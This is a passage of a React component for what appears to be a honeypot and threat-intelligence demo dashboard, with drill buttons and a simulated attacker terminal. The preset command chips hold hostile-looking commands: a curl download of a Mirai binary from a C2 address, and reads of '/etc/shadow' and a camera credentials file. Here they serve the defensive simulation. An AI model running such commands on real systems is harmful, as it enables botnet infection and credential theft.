                    </div>
                    <span className="script-desc">
                      Uploads downloader querying C2 `185.220.101.5:8080/mirai.arm7` &rarr; Quarantined!
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptDropper} disabled={isActionPending}>
                    Drop Payload
                  </button>
                </div>

                {/* Script 4 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">4. Honeytoken Bait Tripwire</span>
                      <span className="script-tag">cat_creds.sh</span>
                    </div>
                    <span className="script-desc">
                      Touches bait `credentials.conf` &rarr; Rickroll reverse payload + hostility score &gt; 8.0!
                    </span>
                    <span className="script-target-link" onClick={() => onNavigateTab('campaigns')} style={{ cursor: 'pointer' }}>
                      👉 View Shamir Quorum Unlock Case
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptHoneytoken} disabled={isActionPending}>
                    Trip Bait
                  </button>
                </div>

                {/* Script 5 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">5. SCADA RTU Grid Exploit</span>
                      <span className="script-tag">modbus_trip.py</span>
                    </div>
                    <span className="script-desc">
                      Injects breaker trip on 192.0.2.140 &rarr; 3.5x blast radius multiplier in Intel!
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptScada} disabled={isActionPending}>
                    Trip SCADA
                  </button>
                </div>

                {/* Script 6 */}
                <div className="script-item-card">
                  <div className="script-info">
                    <div className="script-title-row">
                      <span className="script-name">6. C2 Rotation & Evasive Pivot</span>
                      <span className="script-tag">adaptive_pivot.sh</span>
                    </div>
                    <span className="script-desc">
                      Rotates IP to 203.0.113.88 with reused C2 &rarr; Intel engine correlates via C2!
                    </span>
                    <span className="script-target-link" onClick={() => onNavigateTab('campaigns')} style={{ cursor: 'pointer' }}>
                      👉 View Graph Clustering
                    </span>
                  </div>
                  <button type="button" className="btn-run-script" onClick={runScriptAdapt} disabled={isActionPending}>
                    Pivot Attacker
                  </button>
                </div>
              </div>
            </div>
          </div>

          {/* Bottom Card: Live Demo Scripts Integrated Across Tabs */}
          <div className="hacker-card">
            <div className="hacker-card-header">
              <div className="hacker-card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" color="#38bdf8">
                  <polygon points="5 3 19 12 5 21 5 3" />
                </svg>
                <span>Live Demo Scripts Integrated Across Tabs</span>
              </div>
              <span className="hacker-card-badge badge-cyan">Full Master Drills</span>
            </div>

            <div className="hacker-card-body">
              <div className="cross-tab-scenarios-grid">
                {/* Scenario 1 */}
                <div className="scenario-card">
                  <div className="scenario-top">
                    <span className="scenario-title">
                      <span style={{ color: '#38bdf8' }}>Drill A:</span> False Positive Safeguard
                    </span>
                    <span className="scenario-desc">
                      Pedestrian flagged. Stream stays blurred. Attacker attempts unmasking &rarr; BLOCKED 403 &amp; logged.
                    </span>
                  </div>
                  <div className="scenario-actions">
                    <button type="button" className="btn-launch-drill" onClick={handleLaunchDrillA} disabled={isActionPending}>
                      Run Drill A
                    </button>
                    <button type="button" className="btn-jump-tab" onClick={() => onNavigateTab('campaigns')}>
                      Inspect Audit Chain →
                    </button>
                  </div>
                </div>

                {/* Scenario 2 */}
                <div className="scenario-card">
                  <div className="scenario-top">
                    <span className="scenario-title">
                      <span style={{ color: '#f59e0b' }}>Drill B:</span> Honeypot & Quorum Unlock
                    </span>
                    <span className="scenario-desc">
                      Attacker trips honeytoken. Hostility &gt; 8.0. Case CASE-2026-001 opens for Shamir 2-of-3 quorum.
                    </span>
                  </div>
                  <div className="scenario-actions">
                    <button type="button" className="btn-launch-drill" onClick={handleLaunchDrillB} disabled={isActionPending}>
                      Run Drill B
                    </button>
                    <button type="button" className="btn-jump-tab" onClick={() => onNavigateTab('campaigns')}>
                      Vote in Quorum →
                    </button>
                  </div>
                </div>

                {/* Scenario 3 */}
                <div className="scenario-card">
                  <div className="scenario-top">
                    <span className="scenario-title">
                      <span style={{ color: '#fb7185' }}>Drill C:</span> Multi-Group Campaign Cluster
                    </span>
                    <span className="scenario-desc">
                      3 botnet clusters hit infrastructure. Intel correlates adapted attacker IP rotation via C2.
                    </span>
                  </div>
                  <div className="scenario-actions">
                    <button type="button" className="btn-launch-drill" onClick={handleLaunchDrillC} disabled={isActionPending}>
                      Run Drill C
                    </button>
                    <button type="button" className="btn-jump-tab" onClick={() => onNavigateTab('campaigns')}>
                      View Cluster Graph →
                    </button>
                  </div>
                </div>

                {/* Scenario 4 */}
                <div className="scenario-card">
                  <div className="scenario-top">
                    <span className="scenario-title">
                      <span style={{ color: '#34d399' }}>Federation:</span> Cross-City Threat Share
                    </span>
                    <span className="scenario-desc">
                      Campaign hash published on chain. City B reads smart contract and neutralizes attacker pre-emptively!
                    </span>
                  </div>
                  <div className="scenario-actions">
                    <button type="button" className="btn-launch-drill" onClick={handleLaunchFederation} disabled={isActionPending}>
                      Simulate City B
                    </button>
                    <button type="button" className="btn-jump-tab" onClick={() => onNavigateTab('campaigns')}>
                      Inspect Registry →
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* 3. INTERACTIVE LIVE ATTACK TERMINAL (CLI) */}
      <div className="attack-terminal-card">
        <div className="terminal-header">
          <div className="terminal-title-dots">
            <span className="terminal-dot dot-red" />
            <span className="terminal-dot dot-yellow" />
            <span className="terminal-dot dot-green" />
            <span className="terminal-title-text">root@kali-edge-exploit: /opt/aegis-strike (bash)</span>
          </div>
          <span style={{ fontSize: '0.7rem', color: '#64748b', fontFamily: 'var(--font-mono)' }}>
            Real-Time Socket // Port 2222 Honeypot Bridge
          </span>
        </div>

        <div className="terminal-body">
          {terminalLines.map((line, idx) => (
            <div key={idx} className={`terminal-line terminal-line-${line.type || 'cmd'}`}>
              {line.type === 'cmd' && <span className="prompt">root@kali:~# </span>}
              {line.text}
            </div>
          ))}
          <div ref={terminalEndRef} />
        </div>

        {/* Quick Command Chips */}
        <div className="terminal-quick-chips">
          <span style={{ fontSize: '0.675rem', color: '#64748b', marginRight: '0.2rem' }}>Quick Snippets:</span>
          {[
            'uname -a',
            'ls -la /etc/camera',
            'cat /etc/camera/credentials.conf',
            'curl -s http://185.220.101.5:8080/mirai.arm7 -o /tmp/bot',
            'cat /etc/shadow',
            'whoami',
            'ps aux',
            'ifconfig eth0',
          ].map((cmd) => (
            <button key={cmd} type="button" className="quick-chip" onClick={() => handlePresetCmd(cmd)}>
              {cmd}
            </button>
          ))}
        </div>

        {/* Input prompt */}
        <form className="terminal-input-bar" onSubmit={handleCliSubmit}>
          <span className="terminal-prompt-label">root@kali:~#</span>
          <input
            type="text"
            className="terminal-input"
            value={cliInput}
            onChange={(e) => setCliInput(e.target.value)}
            placeholder="Type bash command and hit Enter (e.g. cat /etc/camera/credentials.conf)..."
          />
          <button type="submit" className="btn-run-script" style={{ padding: '0.25rem 0.65rem', fontSize: '0.7rem' }}>
            Send
          </button>
        </form>
      </div>
    </div>
  )
}
